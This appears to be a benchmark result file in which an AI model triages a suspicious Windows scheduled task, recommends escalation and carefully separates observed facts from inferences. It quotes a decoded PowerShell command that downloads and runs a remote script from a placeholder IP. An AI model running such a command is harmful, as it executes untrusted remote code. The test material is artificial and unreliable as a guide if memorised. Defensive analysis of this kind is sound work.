@@ -1,0 +1,80 @@
+{
+ "scenario_id": "S23",
+ "condition": "C1",
+ "variant": "P2",
+ "backend": "openai:gpt-6-luna",
+ "sample": 0,
+ "attempts": [
+  {
+   "answer": "{\n  \"assessment\": \"malicious\",\n  \"confidence\": 0.99,\n  \"supporting_observations\": [\n    {\n      \"claim\": \"At 13:41:04 UTC, hana.ito registered the alerted task, named \\\\Microsoft\\\\Windows\\\\SyncCheck, on WS-HITO-01.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\"S23-00116\"]\n    },\n    {\n      \"claim\": \"The task launches PowerShell with -nop, a hidden window, and an encoded command that decodes to `IEX (iwr http://203.0.113.66/s.ps1)`, indicating an attempt to retrieve and execute remote content.\",\n      \"claim_type\": \"inferred_claim\",\n      \"record_ids\": [\"S23-00116\"]\n    },\n    {\n      \"claim\": \"The task's PowerShell action and Microsoft-style task path do not match the organization's described software-deployment convention, which uses \\\\RB-IT\\\\Deploy-<App> tasks running msiexec.\",\n      \"claim_type\": \"inferred_claim\",\n      \"record_ids\": [\"S23-00116\"]\n    },\n    {\n      \"claim\": \"The task is configured to start at its registration time and to run as hana.ito at least privilege.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\"S23-00116\"]\n    }\n  ],\n  \"known_telemetry_limitations\": [\n    \"The available records establish task registration and its configured action, but do not show whether the task executed.\",\n    \"The provided records do not include PowerShell process or script-block telemetry, task execution results, or evidence of a request to the URL embedded in the task.\",\n    \"The content served from the embedded URL and any resulting host impact are not shown.\"\n  ],\n  \"claims_not_established\": [\n    \"Whether the task successfully ran or retrieved and executed the remote script.\",\n    \"Who or what caused the task to be created using hana.ito's session.\",\n    \"Whether the task remains present or whether additional payloads or persistence mechanisms were installed.\"\n  ],\n  \"recommended_action\": \"escalate\",\n  \"additional_evidence_needed\": [\n    \"Task Scheduler operational history and current task state for \\\\Microsoft\\\\Windows\\\\SyncCheck.\",\n    \"PowerShell process-creation, script-block, and related endpoint telemetry around and after 13:41:04 UTC.\",\n    \"Proxy, firewall, DNS, or packet records to determine whether the host contacted 203.0.113.66.\",\n    \"The script or payload content, if collected, and endpoint file/Defender detections for the relevant period.\",\n    \"User-session and authentication evidence to establish how the task was created.\"\n  ],\n  \"unrelated_findings\": [\n    \"A UserAssist registry value appears to contain a ROT13-encoded path to mstsc.exe, suggesting possible Remote Desktop client use on a staff workstation. This is separate from the alerted task; the record alone does not establish a remote connection. Record: S23-00064.\"\n  ]\n}",
+   "valid": true,
+   "errors": [],
+   "usage": {
+    "input": 32594,
+    "output": 2071
+   }
+  }
+ ],
+ "parsed": {
+  "assessment": "malicious",
+  "confidence": 0.99,
+  "supporting_observations": [
+   {
+    "claim": "At 13:41:04 UTC, hana.ito registered the alerted task, named \\Microsoft\\Windows\\SyncCheck, on WS-HITO-01.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "S23-00116"
+    ]
+   },
+   {
+    "claim": "The task launches PowerShell with -nop, a hidden window, and an encoded command that decodes to `IEX (iwr http://203.0.113.66/s.ps1)`, indicating an attempt to retrieve and execute remote content.",
+    "claim_type": "inferred_claim",
+    "record_ids": [
+     "S23-00116"
+    ]
+   },
+   {
+    "claim": "The task's PowerShell action and Microsoft-style task path do not match the organization's described software-deployment convention, which uses \\RB-IT\\Deploy-<App> tasks running msiexec.",
+    "claim_type": "inferred_claim",
+    "record_ids": [
+     "S23-00116"
+    ]
+   },
+   {
+    "claim": "The task is configured to start at its registration time and to run as hana.ito at least privilege.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "S23-00116"
+    ]
+   }
+  ],
+  "known_telemetry_limitations": [
+   "The available records establish task registration and its configured action, but do not show whether the task executed.",
+   "The provided records do not include PowerShell process or script-block telemetry, task execution results, or evidence of a request to the URL embedded in the task.",
+   "The content served from the embedded URL and any resulting host impact are not shown."
+  ],
+  "claims_not_established": [
+   "Whether the task successfully ran or retrieved and executed the remote script.",
+   "Who or what caused the task to be created using hana.ito's session.",
+   "Whether the task remains present or whether additional payloads or persistence mechanisms were installed."
+  ],
+  "recommended_action": "escalate",
+  "additional_evidence_needed": [
+   "Task Scheduler operational history and current task state for \\Microsoft\\Windows\\SyncCheck.",
+   "PowerShell process-creation, script-block, and related endpoint telemetry around and after 13:41:04 UTC.",
+   "Proxy, firewall, DNS, or packet records to determine whether the host contacted 203.0.113.66.",
+   "The script or payload content, if collected, and endpoint file/Defender detections for the relevant period.",
+   "User-session and authentication evidence to establish how the task was created."
+  ],
+  "unrelated_findings": [
+   "A UserAssist registry value appears to contain a ROT13-encoded path to mstsc.exe, suggesting possible Remote Desktop client use on a staff workstation. This is separate from the alerted task; the record alone does not establish a remote connection. Record: S23-00064."
+  ]
+ },
+ "status": "VALID",
+ "faithfulness_precheck": {
+  "n_cited": 4,
+  "n_missing": 0,
+  "missing": []
+ },
+ "duration_s": 23.0
+}
